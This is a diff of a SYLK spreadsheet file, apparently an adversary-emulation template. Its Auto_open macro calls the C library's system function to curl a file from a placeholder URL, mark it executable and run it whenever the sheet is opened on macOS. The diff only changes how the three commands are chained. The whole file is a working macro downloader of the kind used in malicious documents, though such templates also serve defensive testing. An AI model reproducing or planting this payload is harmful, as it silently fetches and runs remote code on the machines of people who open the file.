@@ -1,6 +1,6 @@
 ID;P
 O;E
 NN;NAuto_open;ER101C1;KD00mFist;F
-C;X1;Y101;K0;ECALL("libc.dylib","system","JC","/usr/bin/curl -k REMOTE_PAYLOAD_URL -o operator-payload; chmod +x operator-payload; ./operator-payload -name TECHNIQUE_NAME &")
+C;X1;Y101;K0;ECALL("libc.dylib","system","JC","/usr/bin/curl -k REMOTE_PAYLOAD_URL -o operator-payload && chmod +x operator-payload  && ./operator-payload -name TECHNIQUE_NAME &")
 C;X1;Y102;K0;EHALT()
 E
